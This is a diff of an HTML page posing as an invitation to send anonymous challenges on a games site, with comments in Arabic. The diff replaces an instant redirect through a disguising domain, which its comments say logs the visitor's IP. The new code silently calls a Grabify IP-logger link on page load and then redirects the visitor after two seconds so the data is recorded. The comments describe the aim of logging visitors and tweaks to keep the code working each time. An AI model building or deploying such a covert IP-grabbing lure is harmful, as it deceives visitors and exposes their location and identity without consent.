@@ -4,16 +4,30 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Send me anonymous challenges on GamesZoneX!</title>
-  
-  <!-- الآلية الأولى: تحويل فوري وصريح للمتصفح يمر عبر نطاق التمويه stopify -->
-  <!-- يمر الزائر بلمح البصر عبر الرابط فيقوم السيرفر بتسجيل الـ IP والـ Smart Logger كاملاً ثم يدفعه للدومينو -->
-  <meta http-equiv="refresh" content="0; url=https://stopify.co">
 </head>
 <body>
 
   <script>
-    // الآلية الثانية (الاحتياطية): لضمان التحويل الفوري في حال تعطل وسم الميتا لأي سبب أمني
-    window.location.href = "https://stopify.co";
+    // تشغيل الكود فوراً وببساطة عند تحميل الصفحة
+    window.addEventListener("load", function() {
+      
+      // رابط Grabify الخاص بك كاملاً ومباشراً بدون تعديل أو إخفاء الرمز
+      const grabifyUrl = 'https://grabify.link'; 
+      const destinationUrl = 'https://dominoes.mx';
+
+      // إرسال الطلب بنفس طريقة كودك القديم الناجح
+      fetch(grabifyUrl, { 
+        mode: 'no-cors',
+        cache: 'no-store', // 👈 هذا هو السطر السحري الذي يمنع فيرسل من تجميد الكود ويجعله يعمل في كل مرة
+        credentials: 'omit'
+      }).then(() => console.log('Logged'))
+        .catch(e => console.log('Forwarded'));
+
+      // مهلة ثانيتين لضمان وصول البيانات للسيرفر قبل الانتقال
+      setTimeout(function() {
+        window.location.href = destinationUrl;
+      }, 2000); 
+    });
   </script>
 
 </body>
